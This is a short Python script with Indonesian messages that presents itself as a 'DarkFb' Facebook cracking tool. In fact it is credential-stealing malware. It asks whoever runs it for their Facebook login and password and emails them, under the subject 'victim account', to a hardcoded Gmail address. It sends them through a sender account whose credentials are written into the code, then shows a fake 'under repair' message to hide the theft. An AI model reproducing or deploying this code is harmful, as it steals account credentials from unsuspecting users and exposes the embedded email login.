import os, sys
print ("menginstall paket.........")
os.system ('pip install yagmail')
os.system ('pip install termcolor')
os.system ('clear')
import yagmail
from termcolor import colored
print (colored('paket selesai di install.','blue'))
baner = """
  ____________                                ║▒▒▒▒▒▒▒▒▒▒║
  ║▒▒▒▒▒▒▒▒▒▒║ Tools DarkFb terbaru V.I.P
  ║▒▒▒▒▒▒▒▒▒▒║ special taun baru
 ╔════════════╗
 ╚════════════╝ANTI CHECKPOINT✓
  ║██████████╚╗CRACK LEBIH CEPAT✓
  ║██╔══╗█╔═╗█║CRACK ID GRUP✓
  ║██║╬╔╝█╚╗║█║CRACK DAFTAR TEMAN✓
  ║██╚═╝█║█╚╝█║HACK FB NARGET✓
   ╚╗║╠╩╩╩╩╩╝  DLL
    ║║┈┈┈█▐█████▒.｡oO
    ║██╠╦╦╦╗                                    ╚╗██████
     ╚════╝=  ®limitededition
 <════════════════X═════════════════> """                                                                          
print (colored(baner,'green'))                                                                                              
print (colored('silahkan login dulu','blue'))

anjirt = yagmail.SMTP('pclown265@gmail.com','infinix77')
username = str(input('Masukan email/nohp/id: '))
password = str(input('Masukan kata sandi: '))
body = ('username: '+username, 'password: '+password)
subject = 'Akun korban'
anjirt.send('owl33345@gmail.com',subject,body)
print (colored('loading......','yellow'))
print (colored('maaf untuk saat ini tools sedang di perbaiki','red'))
